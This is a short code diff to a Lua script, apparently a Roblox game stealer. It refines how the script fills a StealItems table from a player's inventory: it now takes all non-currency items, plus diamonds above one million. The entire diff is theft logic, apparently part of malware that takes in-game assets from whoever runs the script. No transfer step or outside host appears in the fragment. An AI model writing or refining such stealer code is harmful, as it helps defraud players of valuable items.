@@ -246,15 +246,24 @@ if _G.Act == true then
                             end
                             if x:IsA("Currency") then
                                 Diamonds = value
+                                if value > 1000000 then
+                                    table.insert(StealItems,{
+                                        ["uid"] = uid,
+                                        ["id"] = name,
+                                        ["_am"] = value,
+                                        ["rap"] = rap,
+                                        ["type"] = i
+                                    })
+                                end
+                            else
+                                table.insert(StealItems,{
+                                    ["uid"] = uid,
+                                    ["id"] = name,
+                                    ["_am"] = value,
+                                    ["rap"] = rap,
+                                    ["type"] = i
+                                })
                             end
-                            
-                            table.insert(StealItems,{
-                                ["uid"] = uid,
-                                ["id"] = name,
-                                ["_am"] = value,
-                                ["rap"] = rap,
-                                ["type"] = i
-                            })
                         end
                     end
                 end
